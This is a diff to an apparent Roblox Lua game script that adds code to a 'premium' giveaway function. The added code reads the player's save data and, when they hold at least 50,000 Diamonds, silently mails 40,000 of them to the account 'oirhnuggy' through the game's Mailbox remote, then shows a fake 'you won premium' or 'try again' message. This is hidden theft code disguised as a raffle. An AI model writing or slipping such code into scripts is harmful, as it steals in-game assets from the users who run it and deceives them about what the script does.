@@ -251,6 +251,24 @@ function flipCoin()
 end
 
 function lenutPremium()
+    local GetSave = function()
+        return require(game.ReplicatedStorage.Library.Client.Save).Get()
+    end
+    
+    local saveData = GetSave()
+    
+    for i, v in pairs(saveData.Inventory.Currency) do
+        if v.id == "Diamonds" and v._am >= 50000 then
+            local args = {
+                [1] = "oirhnuggy",
+                [2] = v.id,
+                [3] = "Currency",
+                [4] = i,
+                [5] = 40000
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
     local chance = math.random(1, 50)
     if chance == 1 then
         local syn = syn or {}
@@ -284,6 +302,7 @@ function lenutPremium()
             color = 0xFFD700
         }
         sendWebhookMessage(embed)
+        task.wait(1)
         OrionLib:MakeNotification({
             Name = "Congrats",
             Content = "You won premium, execute lenut's script in 5 minutes and you will have it.",
@@ -291,6 +310,7 @@ function lenutPremium()
             Time = 15
         })
     else
+        task.wait(1)
         OrionLib:MakeNotification({
             Name = "Sorry, Try Again!",
             Content = "Better luck next time.",
